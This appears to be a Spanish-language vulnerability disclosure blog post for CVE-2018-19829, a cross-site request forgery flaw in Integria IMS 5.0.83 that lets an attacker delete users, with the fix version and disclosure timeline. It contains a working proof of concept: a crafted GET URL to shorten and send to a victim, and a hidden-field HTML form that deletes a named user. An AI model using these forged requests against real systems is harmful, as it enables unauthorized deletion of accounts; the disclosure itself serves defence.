+++
date = "2018-12-17"
title = "CVE-2018-19829 Integria IMS 5.0.83 - Cross-Site Request Forgery"
author = "Javier Olmedo"
toc = false
+++

Las vulnerabilidades[Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_\(CSRF\))encontradas en el software[Integria IMS 5.0.83](https://sourceforge.net/projects/integria/files/5.0.83/)han quedado solucionadas. Estas,**permit铆an a un usuario malintencionado borrar usuarios de la aplicaci贸n**a trav茅s de este ataque. La vulnerabilidad, ha sido asociada al[CVE-2018-19829](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-19829).

## CVE-2018-19829

### Integria IMS 5.0.83 - Cross-Site Request Forgery (CSRF)

[![/images/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery_001.png](/images/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery_001.png)](/images/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery_001.png)

Integria IMS es un**software de help desk**sencillo, potente y f谩cil de usar. Dispone de inventario automatizado y controlado desde un solo interfaz. Agiliza los procesos reduciendo los tiempos y costes de gesti贸n en sus proyectos. Gracias a sus informes personalizados estar谩 informado y podr谩 ver f谩cilmente la gesti贸n y calidad del servicio dado en tiempo real.

- Vulnerabilidad descubierta por[Javier Olmedo](https://twitter.com/JJavierOlmedo)el**08/11/2018**
-  Publicada el**17/12/2018**
- [CVE-2018-19829](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19829)
- Link del software[Integria IMS](https://sourceforge.net/projects/integria/files/5.0.83/)
- Versi贸n vulnerable =**5.0.83 y anteriores**
- 锔 Soluci贸n:**actualizar**a la versi贸n[5.0.84](https://sourceforge.net/projects/integria/files/5.0.84/)

## Vector de ataque / Criticidad de la explotaci贸n

### CRITICIDAD -  MEDIA 

A trav茅s de las vulnerabilidades[Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_\(CSRF\)), un atacante**podr铆a aprovecharse de la confianza que tiene la aplicaci贸n sobre los usuarios leg铆timos**para crear un enlace o formulario malicioso que ser谩 ejecutado a trav茅s de estos.

## Par谩metros / Recursos vulnerables

Durante la auditoria, se observ贸 que el formulario encargado de borrar los usuarios**carec铆a de token anti-CSRF.**

[![/images/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery_002.png](/images/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery_002.png)](/images/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery_002.png)

Ejemplo de petici贸n POST para borrar un usuario

Esto, permitir铆a a un atacante**crear un enlace malicioso**modificando el valor del par谩metro`id`para realizar acciones de eliminaci贸n de usuarios sobre la aplicaci贸n, adem谩s, tambi茅n secomprob贸 que**las peticiones POST pod铆an ser cambiadas al m茅todo GET.**

[![/images/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery_003.gif](/images/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery_003.gif)](/images/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery_003.gif)

## Prueba de concepto (PoC)

En la siguiente prueba de concepto se ha dividido la pantalla en dos partes, en la parte izquierda se encontrar铆a un usuario en el panel de administraci贸n, mientras que en la parte derecha, un atacante genera un bot贸n malicioso previamente configurado para realizar la acci贸n de eliminaci贸n de usuarios.

### NOTA

> Se ha utilizado un formulario para la explotaci贸n de la vulnerabilidad, pero en un escenario real, a un atacante le bastar铆a con generar el enlace y acortar la URL ([Google URL Shortener](https://goo.gl/)) para ofuscar la acci贸n e intentar explotar la vulnerabilidad con 茅xito, ya que las peticiones pueden ser cambiadas al m茅todo**GET,**por esta raz贸n se explican dos maneras de explotarla.

### Metodo 1

Acortar la siguiente URL y enviarlo a la v铆ctima.

**URL:**`http://localhost/integria/ajax.php?page=include/ajax/delete_item_general&delete_item=1&name=delete_user&id=[ID]`

## Metodo 2

Generar un bot贸n malicioso

[![/images/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery_004.gif](/images/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery_004.gif)](/images/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery_004.gif)

```html
<html>
 <body>
  <script>history.pushState('', '', '/')</script>
  <form action="http://localhost/integria/index.php">
   <input type="hidden" name="sec" value="users" />
   <input type="hidden" name="sec2" value="godmode&#47;usuarios&#47;lista&#95;usuarios" />
   <input type="hidden" name="borrar&#95;usuario" value="jolmedo" />
   <input type="submit" value="Eliminar usuario jolmedo" />
  </form>
 </body>
</html>
```

## Timeline

- **08/11/2018**Descubrimiento
- **08/11/2018**El desarrollador conoce la vulnerabilidad
- **01/12/2018**Solicitud CVE
- **03/12/2018**Asignaci贸n de CVE-2018-19829 por MITRE
- **10/12/2018**Parcheada
- **14/12/2018**Publicaci贸n vulnerabilidad

## Referencias

- CVE-MITRE -[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19829](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19829)

Un saludo a todos!!